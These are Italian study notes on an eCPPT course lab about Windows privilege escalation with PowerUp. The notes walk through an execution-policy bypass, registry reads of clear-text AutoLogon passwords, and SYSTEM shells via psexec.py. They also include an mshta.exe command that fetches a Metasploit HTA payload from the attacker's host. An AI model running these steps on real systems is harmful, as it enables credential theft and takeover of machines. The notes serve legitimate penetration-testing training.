# 03 — Privilege Escalation with PowerUp (Privilege Escalation)

> **Modulo:** Privilege Escalation · **Video:** 3/19
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [03_Privilege Escalation with PowerUp.txt](03_Privilege Escalation with PowerUp.txt) · [03_Privilege Escalation with PowerUp.srt](03_Privilege Escalation with PowerUp.srt)

## Concetti chiave

- **PowerUp** è uno script PowerShell parte del framework **PowerSploit**, dedicato a **identificare automaticamente vulnerabilità di privesc su Windows**.
- Funzione principale: **`Invoke-PrivescAudit`** (alias di `Invoke-AllChecks`) — esegue una batteria di controlli automatici.
- Categorie di check eseguiti:
  - **Insecure service configurations** (service path modificabile, executable modificabile).
  - **Unquoted service paths**.
  - **Weak registry permissions** (autoruns).
  - **Vulnerable scheduled tasks**.
  - **Insecure file permissions**.
  - **Insecure DLL search orders** (DLL hijacking).
  - **Stored credentials** (es. WinLogon AutoLogon registry).
- Nel lab: PowerUp trova **clear-text credentials** dell'administrator nel registry WinLogon.

## Spiegazione approfondita

### Cos'è PowerSploit / PowerUp
- **PowerSploit**: framework PowerShell con script offensive per enumeration, exploitation, post-exploitation.
- **PowerUp**: modulo Privesc specifico → automatizza la ricerca di vettori di elevazione.

### Workflow del lab
1. Accesso al target Windows come `student` (non privilegiato).
2. Verifica privilegi → `whoami`, `whoami /priv`, `net localgroup administrators`.
3. Bypass execution policy → import PowerUp → `Invoke-PrivescAudit`.
4. PowerUp identifica credenziali in clear text in WinLogon (AutoLogon).
5. Verifica manuale con `reg query`.
6. Sfruttamento con `runas`, `psexec.py`, o modulo Metasploit `psexec`.

### Vulnerabilità trovata: WinLogon AutoLogon credentials
Le credenziali del **default user/password** per l'AutoLogon sono salvate **in clear-text** nel registry sotto:
`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` → valori `DefaultUserName` e `DefaultPassword`.

### Sfruttamento (tre opzioni mostrate)
1. **`runas /user:administrator cmd`** — apre prompt elevato (richiede inserire la password). Privilegi = Administrator, NON `NT AUTHORITY\SYSTEM`.
2. **`psexec.py` di impacket** da Kali → autenticazione SMB → shell come `NT AUTHORITY\SYSTEM`.
3. **`hta_server` di Metasploit** + `mshta.exe` da prompt elevato → meterpreter session con privilegi elevati.

## Comandi & strumenti

| Comando | Scopo |
|---|---|
| `whoami` / `whoami /priv` | Verifica utente e privilegi correnti |
| `net localgroup administrators` | Lista membri admin locale |
| `powershell -ep bypass` | Apre PowerShell con execution policy bypass |
| `. .\PowerUp.ps1` | Import dello script PowerUp |
| `Invoke-PrivescAudit` | Funzione principale di PowerUp che esegue tutti i check |
| `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName` | Lettura manuale del registry |
| `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword` | Recupero clear-text password |
| `runas.exe /user:administrator cmd` | Apre cmd come administrator |
| `psexec.py administrator@<IP>` | Authenticated remote shell (impacket) |
| `use exploit/windows/misc/hta_server` (msf) | Payload HTA delivery |
| `mshta.exe http://<IP>/<id>.hta` | Esegue HTA come current user (privilegiato) |

## Esempi pratici

```powershell
# Step 1 — Verifica privilegi
whoami
whoami /priv
net localgroup administrators

# Step 2 — Setup ed esecuzione PowerUp
cd C:\Users\student\Desktop\PowerSploit\Privesc
powershell -ep bypass
. .\PowerUp.ps1
Invoke-PrivescAudit

# Step 3 — Verifica manuale credenziali WinLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# Step 4a — Local elevation via runas
runas.exe /user:administrator cmd
```

```bash
# Step 4b — Da Kali: shell SYSTEM via psexec impacket
psexec.py administrator@10.x.x.x
# inserire password trovata
whoami    # → nt authority\system

# Step 4c — Da Kali: meterpreter via HTA
msfconsole -q
use exploit/windows/misc/hta_server
exploit
# poi sul target da prompt elevato:
mshta.exe http://<KALI_IP>:8080/<random>.hta
```

## Punti d'attenzione per l'esame eCPPT

- **PowerUp = primo strumento da provare** quando si è ottenuta una shell low-priv su Windows.
- Funzione fondamentale da memorizzare: **`Invoke-PrivescAudit`** (in versioni vecchie: `Invoke-AllChecks`).
- Differenza importante: `runas` → privilegi di **Administrator**; `psexec` → privilegi di **NT AUTHORITY\SYSTEM**. SYSTEM è più alto.
- **Execution policy**: ricorda di lanciare `powershell -ep bypass` prima di importare lo script.
- PowerUp **è statico**: i check sono predefiniti. Se non trova nulla, prova **PrivescCheck** (video 04) o checklist manuali.
- WinLogon AutoLogon credentials sono una **misconfig classica** — l'esame può presentare esattamente questo scenario.

## Collegamenti con altri video

- Precedente: [[02_Introduction to Privilege Escalation]]
- Prossimo: [[04_Privilege Escalation with Privesc Check]] — script alternativo.
- Locally stored credentials (approfondimento): [[05_ Unattended Installation Files]], [[06_Windows Credential Manager]], [[07_ PowerShell History]].
- Insecure services (cosa PowerUp identifica): [[08_Exploiting Insecure Service Permissions]].
- Registry autoruns: [[09_Privilege Escalation via Registry AutoRuns]].
